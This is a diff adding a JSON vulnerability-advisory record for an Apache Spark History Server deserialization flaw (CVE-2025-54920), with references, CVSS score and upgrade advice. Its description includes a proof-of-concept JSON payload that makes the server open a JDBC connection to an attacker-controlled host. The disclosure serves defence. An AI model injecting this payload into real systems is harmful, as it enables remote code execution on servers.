@@ -1,0 +1,65 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-03-17T19:53:20Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "org.apache.spark:spark-core_2.10"
+  },
+  "Advisory": {
+    "DatabaseId": 342719,
+    "Id": "GSA_kwCzR0hTQS1qd3A2LWN2ajgtZnc2Nc4ABTq_",
+    "GhsaId": "GHSA-jwp6-cvj8-fw65",
+    "References": [
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54920"
+      },
+      {
+        "Url": "https://github.com/apache/spark/pull/51312"
+      },
+      {
+        "Url": "https://github.com/apache/spark/pull/51323"
+      },
+      {
+        "Url": "https://issues.apache.org/jira/browse/SPARK-52381"
+      },
+      {
+        "Url": "https://lists.apache.org/thread/4y9n0nfj7m68o2hpmoxgc0y7dm1lo02s"
+      },
+      {
+        "Url": "http://www.openwall.com/lists/oss-security/2026/03/13/4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-jwp6-cvj8-fw65"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-jwp6-cvj8-fw65"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-54920"
+      }
+    ],
+    "Description": "This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommended to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.\n\n## Summary\n\nApache Spark 3.5.4 and earlier versions contain a code execution vulnerability in the Spark History Web UI due to overly permissive Jackson deserialization of event log data. This allows an attacker with access to the Spark event logs directory to inject malicious JSON payloads that trigger deserialization of arbitrary classes, enabling command execution on the host running the Spark History Server.\n\n## Details\n\nThe vulnerability arises because the Spark History Server uses Jackson polymorphic deserialization with @JsonTypeInfo.Id.CLASS on SparkListenerEvent objects, allowing an attacker to specify arbitrary class names in the event JSON. This behavior permits instantiating unintended classes, such as org.apache.hive.jdbc.HiveConnection, which can perform network calls or other malicious actions during deserialization.\n\nThe attacker can exploit this by injecting crafted JSON content into the Spark event log files, which the History Server then deserializes on startup or when loading event logs. For example, the attacker can force the History Server to open a JDBC connection to a remote attacker-controlled server, demonstrating remote command injection capability.\n\n## Proof of Concept:\n\n1. Run Spark with event logging enabled, writing to a writable directory (spark-logs).\n\n2. Inject the following JSON at the beginning of an event log file:\n\n```\n{\n\n  \"Event\": \"org.apache.hive.jdbc.HiveConnection\",\n  \"uri\": \"jdbc:hive2://\u003cIP\u003e:\u003cPORT\u003e/\",\n  \"info\": {\n    \"hive.metastore.uris\": \"thrift://\u003cIP\u003e:\u003cPORT\u003e\"\n  }\n}\n```\n3. Start the Spark History Server with logs pointing to the modified directory.\n\n4. The Spark History Server initiates a JDBC connection to the attacker’s server, confirming the injection.\n\n## Impact\n\nAn attacker with write access to Spark event logs can execute arbitrary code on the server running the History Server, potentially compromising the entire system.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-16T15:30:41Z",
+    "Severity": "HIGH",
+    "Summary": "Apache Spark: Spark History Server Code Execution Vulnerability",
+    "UpdatedAt": "2026-03-17T19:53:20Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": ""
+      },
+      "VulnerableVersionRange": "\u003c= 2.2.3"
+    }
+  ]
+}
